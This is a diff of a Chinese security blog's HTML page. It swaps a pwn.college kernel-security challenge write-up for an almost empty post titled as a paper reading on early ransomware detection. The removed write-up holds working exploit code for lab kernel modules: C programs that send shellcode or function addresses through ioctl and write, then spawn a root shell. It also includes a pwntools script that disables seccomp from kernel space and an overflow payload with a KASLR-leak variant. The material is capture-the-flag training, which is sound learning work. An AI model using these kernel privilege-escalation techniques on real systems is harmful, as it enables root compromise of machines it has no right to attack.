@@ -16,23 +16,24 @@
   <meta name="author" content="W4y2Sh3ll">
   <meta name="keywords" content="">
   
-    <meta name="description" content="前言 根据要求只贴前两个的WriteUp，后续只写思路 每个题的驱动都是跑在qemu虚拟机的，开启题目后需要vm connect连上qemu，此时lsmod就可以看见安装好的驱动  level1.01echo pwvrvqitxoodqbxa &gt; &#x2F;proc&#x2F;pwncollege | head &#x2F;proc&#x2F;pwncollege  level1.11echo ufyqfbjmxahuzqzi">
+    <meta name="description" content="摘要">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwn.college Kernel Security">
-<meta property="og:url" content="https://www.w4y2sh3ll.top/2024/07/15/pwn-college-Kernel-Security/index.html">
+<meta property="og:title" content="基于API潜在语义的勒索软件早期检测方法">
+<meta property="og:url" content="https://www.w4y2sh3ll.top/2024/10/13/%E5%9F%BA%E4%BA%8EAPI%E6%BD%9C%E5%9C%A8%E8%AF%AD%E4%B9%89%E7%9A%84%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E6%97%A9%E6%9C%9F%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95/index.html">
 <meta property="og:site_name" content="W4y2Sh3ll">
-<meta property="og:description" content="前言 根据要求只贴前两个的WriteUp，后续只写思路 每个题的驱动都是跑在qemu虚拟机的，开启题目后需要vm connect连上qemu，此时lsmod就可以看见安装好的驱动  level1.01echo pwvrvqitxoodqbxa &gt; &#x2F;proc&#x2F;pwncollege | head &#x2F;proc&#x2F;pwncollege  level1.11echo ufyqfbjmxahuzqzi">
+<meta property="og:description" content="摘要">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-07-15T07:44:34.000Z">
-<meta property="article:modified_time" content="2024-10-13T01:41:10.666Z">
+<meta property="article:published_time" content="2024-10-13T01:42:07.000Z">
+<meta property="article:modified_time" content="2024-10-13T01:42:42.186Z">
 <meta property="article:author" content="W4y2Sh3ll">
-<meta property="article:tag" content="Linux Kernel">
-<meta property="article:tag" content="pwn.college">
+<meta property="article:tag" content="论文阅读">
+<meta property="article:tag" content="勒索软件检测">
+<meta property="article:tag" content="Ransomware Detection">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>pwn.college Kernel Security - W4y2Sh3ll</title>
+  <title>基于API潜在语义的勒索软件早期检测方法 - W4y2Sh3ll</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -221,7 +222,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="pwn.college Kernel Security"></span>
+            <span id="subtitle" data-typed-text="基于API潜在语义的勒索软件早期检测方法"></span>
           
         </div>
 
@@ -232,8 +233,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-07-15 15:44" pubdate>
-          2024年7月15日 下午
+        <time datetime="2024-10-13 09:42" pubdate>
+          2024年10月13日 上午
         </time>
       </span>
     
@@ -244,7 +245,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.4k 字
+          2 字
         
       </span>
     
@@ -255,7 +256,7 @@
         
         
         
-          12 分钟
+          1 分钟
         
       </span>
     
@@ -293,353 +294,12 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">pwn.college Kernel Security</h1>
+            <h1 style="display: none">基于API潜在语义的勒索软件早期检测方法</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul>
-<li>根据要求只贴前两个的WriteUp，后续只写思路</li>
-<li>每个题的驱动都是跑在qemu虚拟机的，开启题目后需要<code>vm connect</code>连上qemu，此时<code>lsmod</code>就可以看见安装好的驱动</li>
-</ul>
-<h1 id="level1-0"><a href="#level1-0" class="headerlink" title="level1.0"></a>level1.0</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">echo pwvrvqitxoodqbxa &gt; /proc/pwncollege | head /proc/pwncollege<br></code></pre></td></tr></table></figure>
-
-<h1 id="level1-1"><a href="#level1-1" class="headerlink" title="level1.1"></a>level1.1</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">echo ufyqfbjmxahuzqzi &gt; /proc/pwncollege | head /proc/pwncollege<br></code></pre></td></tr></table></figure>
-
-<h1 id="level2-0"><a href="#level2-0" class="headerlink" title="level2.0"></a>level2.0</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">echo clxyrfcckjpuexis &gt; /proc/pwncollege | dmesg<br></code></pre></td></tr></table></figure>
-
-<h1 id="level2-1"><a href="#level2-1" class="headerlink" title="level2.1"></a>level2.1</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">echo ccvqignnvespgtyp &gt; /proc/pwncollege | dmesg<br></code></pre></td></tr></table></figure>
-
-<h1 id="level3-0"><a href="#level3-0" class="headerlink" title="level3.0"></a>level3.0</h1><p>write写”xpmylzhkfevejscw”</p>
-<!-- echo xpmylzhkfevejscw > /proc/pwncollege | cat /flag -->
-
-
-<h1 id="level3-1"><a href="#level3-1" class="headerlink" title="level3.1"></a>level3.1</h1><p>同 level3.0</p>
-<!--
-echo gwcifabytyzfdpjo > /proc/pwncollege | cat /flag
--->
-
-<h1 id="level4-0"><a href="#level4-0" class="headerlink" title="level4.0"></a>level4.0</h1><p>ioctl传递”emrbpgldsrexybrh”</p>
-<!-- 
-#include <stdio.h>
-#include <fcntl.h>
-
-int main() {
-    int fd=open("/proc/pwncollege",O_RDWR);
-    ioctl(fd,1337,"emrbpgldsrexybrh");
-    system("/bin/sh");
-    return 0;
-}
--->
-
-<h1 id="level4-1"><a href="#level4-1" class="headerlink" title="level4.1"></a>level4.1</h1><p>同 level4.0</p>
-<!-- 
-#include <stdio.h>
-#include <fcntl.h>
-
-int main() {
-    int fd=open("/proc/pwncollege",O_RDWR);
-    ioctl(fd,1337,"gixhsazzowbivqrw");
-    system("/bin/sh");
-    return 0;
-}
--->
-
-<h1 id="level5-0"><a href="#level5-0" class="headerlink" title="level5.0"></a>level5.0</h1><p>ioctl传递后门函数的地址即可</p>
-<!-- 
-#include <stdio.h>
-#include <sys/ioctl.h>
-#include <fcntl.h>
-
-int main() {
-  long win = 0xffffffffc00004cd;
-  int fd = open("/proc/pwncollege", O_WRONLY);
-  ioctl(fd, 1337, win);
-  system("id");
-  system("cat /flag");
-  system("/bin/sh");
-  return 0;
-}
--->
-
-<h1 id="level5-1"><a href="#level5-1" class="headerlink" title="level5.1"></a>level5.1</h1><p>同 level5.0</p>
-<!-- 
-#include <stdio.h>
-#include <sys/ioctl.h>
-#include <fcntl.h>
-
-int main() {
-  long win = 0xffffffffc0000752;
-  int fd = open("/proc/pwncollege", O_WRONLY);
-  ioctl(fd, 1337, win);
-  system("id");
-  system("cat /flag");
-  system("/bin/sh");
-  return 0;
-}
--->
-
-<h1 id="level6-0"><a href="#level6-0" class="headerlink" title="level6.0"></a>level6.0</h1><p>直接传shellcode过去，它会自己执行</p>
-<!-- 
-#include <stdio.h>
-#include <sys/ioctl.h>
-#include <fcntl.h>
-
-int main() {
-  char shellcode[] = "H\xc7\xc7\x00\x00\x00\x00H\xc7\xc0\xd0\x90\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\x90\x8d\x08\x81\xff\xd0\xc3";
-  int fd = open("/proc/pwncollege", O_WRONLY);
-  write(fd,shellcode,sizeof(shellcode));
-  system("id");
-  system("cat /flag");
-  system("/bin/sh");
-  return 0;
-}
--->
-
-<h1 id="level6-1"><a href="#level6-1" class="headerlink" title="level6.1"></a>level6.1</h1><p>同 level6.0</p>
-<!-- 
-#include <stdio.h>
-#include <sys/ioctl.h>
-#include <fcntl.h>
-
-int main() {
-  char shellcode[] = "H\xc7\xc7\x00\x00\x00\x00H\xc7\xc0\xd0\x90\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\x90\x8d\x08\x81\xff\xd0\xc3";
-  int fd = open("/proc/pwncollege", O_WRONLY);
-  write(fd,shellcode,sizeof(shellcode));
-  system("id");
-  system("cat /flag");
-  system("/bin/sh");
-  return 0;
-}
--->
-
-
-<h1 id="level7-0"><a href="#level7-0" class="headerlink" title="level7.0"></a>level7.0</h1><p>需要传一个结构体，字段如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">buf</span>&#123;</span><br>  <span class="hljs-type">long</span> size;<br>  <span class="hljs-type">char</span> shellcode[<span class="hljs-number">4096</span>];<br>  <span class="hljs-type">long</span> call_addr;<br>&#125;;<br></code></pre></td></tr></table></figure>
-<p>传入的shellcode会被复制到内核开辟的一段可执行地址内，该地址固定，将call_addr设置为该地址就可以跳过去执行shellcode</p>
-<!-- 
-#include <stdio.h>
-#include <sys/ioctl.h>
-#include <fcntl.h>
-
-struct buf{
-  long size;
-  char shellcode[4096];
-  long call_addr;
-};
-
-int main() {
-  char shellcode[] = "H\xc7\xc7\x00\x00\x00\x00H\xc7\xc0\xd0\x90\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\x90\x8d\x08\x81\xff\xd0\xc3";
-  // char shellcode[] = "H\xc7\xc7\x00\x00\x00\x00H\xc7\xc0\xe0\x95\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\xc0\x92\x08\x81\xff\xd0\xc3";
-  struct buf A;
-  int fd = open("/proc/pwncollege", O_WRONLY);
-  A.size=4096;
-  memcpy(A.shellcode,shellcode,sizeof(shellcode));
-  // A.call_addr=0xffffc90000045000;//local
-  A.call_addr=0xffffc90000085000;//remote
-  ioctl(fd, 1337, &A);
-  system("id");
-  system("cat /flag");
-  system("/bin/sh");
-  return 0;
-}
--->
-
-<h1 id="level7-1"><a href="#level7-1" class="headerlink" title="level7.1"></a>level7.1</h1><p>同 level7.0</p>
-<!-- 
-#include <stdio.h>
-#include <sys/ioctl.h>
-#include <fcntl.h>
-
-struct buf{
-  long size;
-  char shellcode[4096];
-  long call_addr;
-};
-
-int main() {
-  char shellcode[] = "H\xc7\xc7\x00\x00\x00\x00H\xc7\xc0\xd0\x90\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\x90\x8d\x08\x81\xff\xd0\xc3";
-  // char shellcode[] = "H\xc7\xc7\x00\x00\x00\x00H\xc7\xc0\xe0\x95\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\xc0\x92\x08\x81\xff\xd0\xc3";
-  struct buf A;
-  int fd = open("/proc/pwncollege", O_WRONLY);
-  A.size=4096;
-  memcpy(A.shellcode,shellcode,sizeof(shellcode));
-  // A.call_addr=0xffffc90000045000;//local
-  A.call_addr=0xffffc90000085000;//remote
-  ioctl(fd, 1337, &A);
-  system("id");
-  system("cat /flag");
-  system("/bin/sh");
-  return 0;
-}
--->
-
-
-<h1 id="level8-0"><a href="#level8-0" class="headerlink" title="level8.0"></a>level8.0</h1><p>这个卡了两天0.0，需要注意下面几个点：</p>
-<ul>
-<li>&#x2F;proc&#x2F;challenge只有root用户才有RW权限</li>
-<li>&#x2F;challenge下除了babykernel_level8.1.ko还有带SUID的ELF程序babykernel_level8.1</li>
-<li>babykernel_level8.1可以执行任意shellcode，但是seccomp禁用了除了write外的所有系统调用；babykernel_level8.1.ko的write可以接收用户空间的shellcode以执行</li>
-<li>因为babykernel_level8.1有SUID所以可以读写&#x2F;proc&#x2F;challenge</li>
-<li>思路就是通过babykernel_level8.1向&#x2F;proc&#x2F;challenge写入shellcode在内核空间中关闭seccomp，然后在用户空间ORW读取flag</li>
-<li>注意通过current_task_struct-&gt;thread_info.flags关闭seccomp只能作用于该进程，通过system(‘&#x2F;bin&#x2F;sh’)获取的shell是子进程，seccomp仍然生效</li>
-</ul>
-<!-- 
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-# This exploit template was generated via:
-# $ pwn template
-from pwn import *
-
-# Set up pwntools for the correct architecture
-exe = context.binary = ELF(args.EXE or '/challenge/babykernel_level8.1')
-context.terminal = ['tmux', 'splitw', '-h']
-# Many built-in settings can be controlled on the command-line and show up
-# in "args".  For example, to dump all data sent/received, and disable ASLR
-# for all created processes...
-# ./exploit.py DEBUG NOASLR
-
-
-
-def start(argv=[], *a, **kw):
-    '''Start the exploit against the target.'''
-    if args.GDB:
-        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
-    else:
-        return process([exe.path] + argv, *a, **kw)
-
-# Specify your GDB script here for debugging
-# GDB will be launched if the exploit is run via e.g.
-# ./exploit.py GDB
-gdbscript = '''
-continue
-'''.format(**locals())
-
-#===========================================================
-#                    EXPLOIT GOES HERE
-#===========================================================
-
-io = start()
-# shellcode = asm(shellcraft.sh())
-# payload = fit({
-#     32: 0xdeadbeef,
-#     'iaaa': [1, 2, 'Hello', 3]
-# }, length=128)
-# io.send(payload)
-# flag = io.recv(...)
-# log.success(flag)
-rdi=0x0000000000402273
-sc=b'j\x03_j-Z\xbe\xa0p31j\x01X\x0f\x05H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8.gm`f\x01\x01\x01H1\x04$H\x89\xe71\xd21\xf6j\x02X\x0f\x051\xc0j\x04_jPZ\xbe\x01\x01\x01\x01\x81\xf6\x01s20\x0f\x05j\x01_jPZ\xbe\x01\x01\x01\x01\x81\xf6\x01s20j\x01X\x0f\x05'
-sc=sc.ljust(0xa0,b'\x90')
-sc+=b'eH\x8b\x1c%\x00]\x01\x00H\x81#\xff\xfe\xff\xff\xc3\x00'
-# sc+=b'eH\x8b\x1c%\x00]\x01\x00H\x81#\xff\xfe\xff\xffH\xc7\xc7\x00\x00\x00\x00H\xc7\xc0\xd0\x90\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\x90\x8d\x08\x81\xff\xd0\xc3\x00'
-
-io.sendline(sc)
-# io.sendline("cat /flag")
-io.interactive()
--->
-
-<h1 id="level8-1"><a href="#level8-1" class="headerlink" title="level8.1"></a>level8.1</h1><p>同 level8.0</p>
-<!-- 
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-# This exploit template was generated via:
-# $ pwn template
-from pwn import *
-
-# Set up pwntools for the correct architecture
-exe = context.binary = ELF(args.EXE or '/challenge/babykernel_level8.1')
-context.terminal = ['tmux', 'splitw', '-h']
-# Many built-in settings can be controlled on the command-line and show up
-# in "args".  For example, to dump all data sent/received, and disable ASLR
-# for all created processes...
-# ./exploit.py DEBUG NOASLR
-
-
-
-def start(argv=[], *a, **kw):
-    '''Start the exploit against the target.'''
-    if args.GDB:
-        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
-    else:
-        return process([exe.path] + argv, *a, **kw)
-
-# Specify your GDB script here for debugging
-# GDB will be launched if the exploit is run via e.g.
-# ./exploit.py GDB
-gdbscript = '''
-continue
-'''.format(**locals())
-
-#===========================================================
-#                    EXPLOIT GOES HERE
-#===========================================================
-
-io = start()
-# shellcode = asm(shellcraft.sh())
-# payload = fit({
-#     32: 0xdeadbeef,
-#     'iaaa': [1, 2, 'Hello', 3]
-# }, length=128)
-# io.send(payload)
-# flag = io.recv(...)
-# log.success(flag)
-rdi=0x0000000000402273
-sc=b'j\x03_j-Z\xbe\xa0p31j\x01X\x0f\x05H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8.gm`f\x01\x01\x01H1\x04$H\x89\xe71\xd21\xf6j\x02X\x0f\x051\xc0j\x04_jPZ\xbe\x01\x01\x01\x01\x81\xf6\x01s20\x0f\x05j\x01_jPZ\xbe\x01\x01\x01\x01\x81\xf6\x01s20j\x01X\x0f\x05'
-sc=sc.ljust(0xa0,b'\x90')
-sc+=b'eH\x8b\x1c%\x00]\x01\x00H\x81#\xff\xfe\xff\xff\xc3\x00'
-# sc+=b'eH\x8b\x1c%\x00]\x01\x00H\x81#\xff\xfe\xff\xffH\xc7\xc7\x00\x00\x00\x00H\xc7\xc0\xd0\x90\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\x90\x8d\x08\x81\xff\xd0\xc3\x00'
-
-io.sendline(sc)
-# io.sendline("cat /flag")
-io.interactive()
--->
-
-<h1 id="level9-0"><a href="#level9-0" class="headerlink" title="level9.0"></a>level9.0</h1><p>可以控制第一个参数call任意函数，run_cmd(“chmod 777 &#x2F;flag”)</p>
-<!-- 
-#include <stdio.h>
-#include <sys/ioctl.h>
-#include <fcntl.h>
-
-int main() {
-  int fd = open("/proc/pwncollege", O_WRONLY);
-  char payload[]="/bin/chmod 777 /flag ;;;;;;;;;;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x80\x95\x08\x81\xff\xff\xff\xff";
-  write(fd,payload,264);
-  return 0;
-}
--->
-<h1 id="level9-1"><a href="#level9-1" class="headerlink" title="level9.1"></a>level9.1</h1><p>同 level9.0</p>
-<h1 id="level10-0"><a href="#level10-0" class="headerlink" title="level10.0"></a>level10.0</h1><p>和level9一样，但是开启了KASLR，泄露printk地址后计算run_cmd偏移再通过溢出修改printk指针为run_cmd</p>
-<!-- 
-#include <stdio.h>
-#include <sys/ioctl.h>
-#include <fcntl.h>
-#include <stdint.h>
-#include <string.h>
-
-void int64_to_bytes(int64_t num, uint8_t *bytes, int byte_count) {
-    for (int i = 0; i < byte_count; i++) {
-        bytes[i] = (num >> (8 * i)) & 0xFF;
-    }
-}
-
-
-int main() {
-  long printk_addr,run_cmd_addr;
-  printk_addr=0xffffffffaf8b6309;
-  run_cmd_addr=printk_addr-0x2CD89;
-  uint8_t bytes[8];
-  int64_to_bytes(run_cmd_addr,bytes,8);
-  int fd = open("/proc/pwncollege", O_WRONLY);
-  char payload[]="/bin/chmod 777 /flag ;;;;;;;;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
-  memcpy(payload+256,bytes,8);
-  write(fd,payload,264);
-  return 0;
-}
- -->
-
-<h1 id="level10-1"><a href="#level10-1" class="headerlink" title="level10.1"></a>level10.1</h1><p>同 level10.0</p>
-<h1 id="level11-0"><a href="#level11-0" class="headerlink" title="level11.0"></a>level11.0</h1><h1 id="level11-1"><a href="#level11-1" class="headerlink" title="level11.1"></a>level11.1</h1><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
+                <h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
                 
               </div>
             
@@ -657,12 +317,12 @@ int main() {
     
       <span class="category-chain">
         
-  <a href="/categories/pwn-college/" class="category-chain-item">pwn.college</a>
+  <a href="/categories/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/" class="category-chain-item">论文阅读</a>
   
   
     <span>></span>
     
-  <a href="/categories/pwn-college/Linux-Kernel-Security/" class="category-chain-item">Linux Kernel Security</a>
+  <a href="/categories/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E6%A3%80%E6%B5%8B/" class="category-chain-item">勒索软件检测</a>
   
   
 
@@ -679,9 +339,11 @@ int main() {
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/Linux-Kernel/">#Linux Kernel</a>
+        <a href="/tags/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/">#论文阅读</a>
       
-        <a href="/tags/pwn-college/">#pwn.college</a>
+        <a href="/tags/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E6%A3%80%E6%B5%8B/">#勒索软件检测</a>
+      
+        <a href="/tags/Ransomware-Detection/">#Ransomware Detection</a>
       
     </div>
   
@@ -693,8 +355,8 @@ int main() {
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>pwn.college Kernel Security</div>
-      <div>https://www.w4y2sh3ll.top/2024/07/15/pwn-college-Kernel-Security/</div>
+      <div>基于API潜在语义的勒索软件早期检测方法</div>
+      <div>https://www.w4y2sh3ll.top/2024/10/13/基于API潜在语义的勒索软件早期检测方法/</div>
     </div>
     <div class="license-meta">
       
@@ -706,7 +368,7 @@ int main() {
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年7月15日</div>
+          <div>2024年10月13日</div>
         </div>
       
       
@@ -733,29 +395,6 @@ int main() {
 
 
 
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2024/07/22/ImaginaryCTF-2024-PWN-WriteUp/" title="ImaginaryCTF 2024 PWN WriteUp">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">ImaginaryCTF 2024 PWN WriteUp</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2024/07/14/WKCTF2024-WriteUp-Pwn/" title="WKCTF2024 WriteUp Pwn">
-                        <span class="hidden-mobile">WKCTF2024 WriteUp Pwn</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
               
             </div>
 
